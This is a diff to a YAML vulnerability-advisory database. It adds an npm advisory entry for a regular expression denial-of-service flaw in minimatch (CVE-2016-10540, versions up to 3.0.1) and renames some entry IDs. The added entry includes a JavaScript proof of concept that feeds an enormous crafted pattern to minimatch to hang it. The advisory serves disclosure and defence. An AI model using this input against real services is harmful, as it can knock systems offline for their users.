@@ -1,5 +1,45 @@
 ---
-- id: ossindex:npm:minimatch:2017-07-29
+- id: npmjs:npm:minimatch:118
+  title: Regular Expression Denial of Service
+  description: |-
+    Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.
+
+
+    ## Proof of Concept
+    ```
+    var minimatch = require(“minimatch”);
+
+    // utility function for generating long strings
+    var genstr = function (len, chr) {
+      var result = “”;
+      for (i=0; i<=len; i++) {
+        result = result + chr;
+      }
+      return result;
+    }
+
+    var exploit = “[!” + genstr(1000000, “\\”) + “A”;
+
+    // minimatch exploit.
+    console.log(“starting minimatch”);
+    minimatch(“foo”, exploit);
+    console.log(“finishing minimatch”);
+    ```
+  affected_package: minimatch
+  vulnerable_versions:
+  - "<=3.0.1"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2016-10540
+  cwe: CWE-400
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Nick Starke
+  references: https://npmjs.com/advisories/118
+  source_url: https://npmjs.com/advisories/118
+- id: ossindex:npm:minimatch:8405000457
   title: Regular Expression Denial of Service
   description: "> The primary function, minimatch(path, pattern) is vulnerable to
     ReDoS in the pattern parameter.\n> \n> -- [nodesecurity.io](https://nodesecurity.io/advisories/118)"
@@ -16,7 +56,7 @@
   - https://nodesecurity.io/advisories/118
   - https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
   source_url: https://ossindex.net/resource/package/7014132039/vulnerabilities
-- id: snykio:npm:minimatch:CVE-2016-10540
+- id: snykio:npm:minimatch:20160620
   title: Regular Expression Denial of Service (DoS)
   description: |
     [`minimatch`][1] is a minimalistic matching library used for converting
